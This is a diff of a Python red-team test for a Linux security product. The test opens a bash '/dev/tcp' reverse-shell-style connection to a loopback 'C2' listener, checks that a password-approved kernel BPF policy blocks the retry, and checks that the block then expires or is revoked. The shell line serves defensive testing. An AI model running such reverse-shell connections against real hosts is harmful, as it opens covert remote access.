@@ -9,13 +9,14 @@ owner, with the root sensor, broker and policy daemon running, the monitor writi
 1. attacker: bash reverse shell to the C2 listener 127.0.0.1:4444 (must be a root-
    configured response target in /etc/linxai/response.json)
 2. monitor: incident with kernel evidence
-3. AI: the local model proposes the response from the incident (same validation as the
-   agent: exact action, target identical to the evidence, bounded duration)
+3. response: the block is built from the kernel evidence (the local model may only set
+   its duration within 30-300 s; a slow or absent model never blocks containment)
 4. owner: the root broker asks for the administrator password (polkit), installs the
    scoped BPF LSM policy and verifies it
 5. attacker retries with bash and python: both must fail with EPERM; a near-miss port
    must still connect (scope)
-6. owner revokes the policy (second password); the original target connects again
+6. the block expires in the kernel and the target connects again (or, with --revoke,
+   the owner revokes it with a second password)
 """
 import argparse
 from dataclasses import asdict
@@ -47,9 +48,13 @@ def try_connect(port):
 
 
 def bash_shell(port):
-    done = subprocess.run(["/bin/bash", "-c", f"exec 3<>/dev/tcp/{C2[0]}/{port}; echo redteam >&3; exec 3>&-"],
+    # A failed `exec 3<>/dev/tcp/...` does not stop `bash -c` (it still exits 0), so the
+    # outcome is read from bash's own error, and the script exits non-zero on failure.
+    done = subprocess.run(["/bin/bash", "-c", f"exec 3<>/dev/tcp/{C2[0]}/{port} || exit 7; echo redteam >&3; exec 3>&-"],
                           capture_output=True, text=True, timeout=10, stdin=subprocess.DEVNULL)
-    return "connected" if done.returncode == 0 else ("EPERM (blocked)" if "not permitted" in done.stderr else done.stderr.strip()[:120])
+    if "not permitted" in done.stderr:
+        return "EPERM (blocked)"
+    return "connected" if done.returncode == 0 and not done.stderr.strip() else done.stderr.strip()[:120]
 
 
 def main(argv=None):
@@ -57,6 +62,8 @@ def main(argv=None):
     parser.add_argument("--state", default=str(Path.home() / ".linxai"))
     parser.add_argument("--out", default="redteam-block.json")
     parser.add_argument("--model", default="qwen2.5:1.5b")
+    parser.add_argument("--duration", type=int, default=30, help="cap the test policy's lifetime (seconds)")
+    parser.add_argument("--revoke", action="store_true", help="also revoke explicitly (second password) instead of waiting for expiry")
     args = parser.parse_args(argv)
     if os.environ.get("LINXAI_TEST_REDTEAM") != "1":
         print("PENDING: opt in with LINXAI_TEST_REDTEAM=1 on the prepared isolated target"); return 3
@@ -89,15 +96,14 @@ def main(argv=None):
                     seconds=round((incident or {}).get("created", attack_started) - attack_started, 2)):
             return 1
         event = incident["evidence"]
-        proposal = OllamaPlanner(args.model).generate_response(event)
-        valid = (isinstance(proposal, dict) and set(proposal) == {"action", "address", "port", "duration"}
-                 and proposal["action"] == "response.network.block"
-                 and {"address": proposal["address"], "port": proposal["port"]} == event["target"])
-        if not step("local AI proposed a block of exactly the evidenced target", valid, proposal=proposal):
+        from security.response import block_request          # the product's own proposal path
+        request, origin = block_request(event, OllamaPlanner(args.model))
+        request["parameters"]["duration"] = min(request["parameters"]["duration"], args.duration)   # short test policy
+        policy_id = request["parameters"]["policy_id"]
+        if not step("response proposed for exactly the evidenced target",
+                    {"address": request["parameters"]["address"], "port": request["parameters"]["port"]} == event["target"],
+                    origin=origin, duration=request["parameters"]["duration"]):
             return 1
-        policy_id = str(uuid4())
-        request = {"action": "response.network.block", "parameters": {"policy_id": policy_id, "event_id": event["id"],
-                   "address": proposal["address"], "port": proposal["port"], "duration": proposal["duration"]}}
         ActionRegistry(actor_uid=os.getuid()).prepare(request["action"], request["parameters"])
         print(">>> The administrator password is requested now (polkit) to install the kernel block.", flush=True)
         blocked = BrokerClient().run(request)
@@ -108,11 +114,18 @@ def main(argv=None):
         step("attacker bash reverse shell retry is blocked", bash_shell(C2[1]) == "EPERM (blocked)", result=bash_shell(C2[1]))
         step("attacker python retry is blocked", try_connect(C2[1]) == "EPERM (blocked)", result=try_connect(C2[1]))
         step("adjacent port 4443 still connects (scope)", try_connect(C2[1] - 1) == "connected", result=try_connect(C2[1] - 1))
-        print(">>> The administrator password is requested again (polkit) to revoke the block.", flush=True)
-        revoked = BrokerClient().run({"action": "response.policy.revoke", "parameters": {"policy_id": policy_id}})
-        record["revoke"] = asdict(revoked)
-        step("owner revoked the policy", revoked.status == "succeeded" and revoked.verified, status=revoked.status, reason=revoked.reason)
-        step("target reachable again after revocation", try_connect(C2[1]) == "connected", result=try_connect(C2[1]))
+        if args.revoke:
+            print(">>> The administrator password is requested again (polkit) to revoke the block.", flush=True)
+            revoked = BrokerClient().run({"action": "response.policy.revoke", "parameters": {"policy_id": policy_id}})
+            record["revoke"] = asdict(revoked)
+            step("owner revoked the policy", revoked.status == "succeeded" and revoked.verified, status=revoked.status, reason=revoked.reason)
+            step("target reachable again after revocation", try_connect(C2[1]) == "connected", result=try_connect(C2[1]))
+        else:                                   # expiry is enforced in the kernel; no second password
+            deadline = time.monotonic() + request["parameters"]["duration"] + 30
+            while try_connect(C2[1]) != "connected" and time.monotonic() < deadline:
+                time.sleep(2)
+            step("block expired by itself in the kernel; target reachable again", try_connect(C2[1]) == "connected",
+                 waited_s=round(time.time() - attack_started, 1))
     finally:
         c2.close(); near.close()
         record["steps"] = steps
